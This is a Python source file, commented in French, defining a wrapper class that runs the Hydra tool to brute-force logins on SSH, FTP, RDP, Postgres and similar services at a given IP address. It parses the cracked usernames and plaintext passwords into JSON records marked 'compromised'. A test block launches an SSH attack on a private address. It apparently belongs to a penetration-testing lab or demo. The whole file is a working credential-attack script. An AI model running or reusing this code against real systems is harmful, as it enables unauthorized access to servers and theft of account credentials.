import subprocess
import re
import json
import os

class HydraModule:
    def __init__(self, wordlist_path="/usr/share/wordlists"):
        self.user_list = os.path.join(wordlist_path, "users.txt")
        self.pass_list = os.path.join(wordlist_path, "passwords.txt")
        
        # Vérification de sécurité basique
        if not os.path.exists(self.user_list) or not os.path.exists(self.pass_list):
            raise FileNotFoundError("Les wordlists sont introuvables. Vérifiez le volume Docker.")

    def run_bruteforce(self, target_ip, service, port):
        """
        Lance Hydra sur une cible spécifique.
        service: 'ssh', 'ftp', 'rdp', 'postgres', etc.
        """
        print(f"[*] Lancement de Hydra sur {target_ip}:{port} ({service})...")

        # Construction de la commande
        # -L : fichier utilisateurs
        # -P : fichier mots de passe
        # -s : port spécifique
        # -t 4 : 4 tâches en parallèle (pas trop agressif pour la démo)
        # -I : Ignore les infos de restore (pour repartir de zéro à chaque fois)
        # -V : Verbose (utile pour le debug, mais on parse la sortie standard)
        command = [
            "hydra",
            "-L", self.user_list,
            "-P", self.pass_list,
            "-s", str(port),
            "-t", "4", 
            "-I",
            service,
            f"{target_ip}"
        ]

        try:
            # Exécution sécurisée avec Timeout (3 minutes max par service)
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=180 
            )
            
            # On parse le résultat
            return self._parse_output(result.stdout, service, target_ip)

        except subprocess.TimeoutExpired:
            return {"status": "timeout", "creds": []}
        except Exception as e:
            return {"error": str(e)}

    def _parse_output(self, output, service, target_ip):
        """
        Extrait les logins/passwords de la soupe de texte d'Hydra.
        """
        creds = []
        
        # Regex pour capturer la ligne de succès standard d'Hydra :
        # "[22][ssh] host: 192.168.1.1   login: admin   password: password123"
        regex_pattern = r"login:\s+(.+?)\s+password:\s+(.+)$"
        
        for line in output.splitlines():
            # On cherche les lignes qui contiennent un succès
            if "login:" in line and "password:" in line:
                match = re.search(regex_pattern, line)
                if match:
                    creds.append({
                        "service": service,
                        "ip": target_ip,
                        "username": match.group(1).strip(),
                        "password": match.group(2).strip(), # Attention: Plaintext ici
                        "status": "compromised"
                    })
        
        return {
            "tool": "Hydra",
            "target": target_ip,
            "credentials_found": len(creds),
            "results": creds
        }

# --- Test local (Si tu as Hydra installé sur ta machine) ---
if __name__ == "__main__":
    # Assure-toi d'avoir créé les fichiers users.txt et passwords.txt pour tester
    attacker = HydraModule(wordlist_path="./wordlists") 
    
    # Simulation d'attaque SSH
    rapport = attacker.run_bruteforce("192.168.1.15", "ssh", 22)
    print(json.dumps(rapport, indent=4))